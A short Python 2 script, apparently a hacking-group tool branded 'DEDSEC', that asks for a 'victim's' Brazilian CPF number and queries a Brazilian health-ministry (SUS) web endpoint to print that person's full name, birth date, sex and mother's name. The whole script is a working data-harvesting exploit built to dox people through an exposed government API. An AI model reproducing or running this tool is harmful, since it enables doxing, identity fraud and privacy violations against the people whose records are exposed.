#!/usr/bin/env python
# -*- coding: utf-8 -*-
#Instagram : @jeanpseven
# Script para puxar dados pelo CPF usando API do SuS ~ DKR and D3m0l1d0r
 
__author__ =  "modded by Wrench"

import requests,json,sys,os,commands


# Colors
PURPLE = '\033[95m'
CYAN = '\033[96m'
DARKCYAN = '\033[36m'
BLUE = '\033[94m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'
END = '\033[0m'
RESET='\033[1;00m'


# BANNER

print("""\033[91m

   _____  ______ _____   _____ ______ _____ 
 |  __ \|  ____|  __ \ / ____|  ____/ ____|
 | |  | | |__  | |  | | (___ | |__ | |     
 | |  | |  __| | |  | |\___ \|  __|| |     
 | |__| | |____| |__| |____) | |___| |____ 
 |_____/|______|_____/|_____/|______\_____|

\033[0m""")

cpf = raw_input('\033[93mCPF da vitima: \033[93m')

# API
req = requests.get("http://dabsistemas.saude.gov.br/sistemas/sadab/js/buscar_cpf_dbpessoa.json.php?cpf="+str(cpf))
dados = json.loads(req.content)


# LEAK

print("""\033[91m

  _____  ______ _____   _____ ______ _____ 
 |  __ \|  ____|  __ \ / ____|  ____/ ____|
 | |  | | |__  | |  | | (___ | |__ | |     
 | |  | |  __| | |  | |\___ \|  __|| |     
 | |__| | |____| |__| |____) | |___| |____ 
 |_____/|______|_____/|_____/|______\_____|

\033[0m""")
                                       
print("""\033[92m
┌═════════════════════════════════════════════════════════════════════════════┐
█                                                                             █
█                          Holy Lulz, it's DEDSEC                             █ 
█                                                                             █
└═════════════════════════════════════════════════════════════════════════════┘     
\033[0m""")
print("\033[91m=============================================\033[91m")
print('CPF: ', dados['NU_CPF'])
print('Nome Completo: ', dados['NO_PESSOA_FISICA'])
print('Data de Nascimento: ', dados['DT_NASCIMENTO'])
print('Sexo: ', dados['CO_SEXO'])
print('Nome da Mãe: ', dados['NO_MAE'])
print("\033[91m=============================================\033[91m")
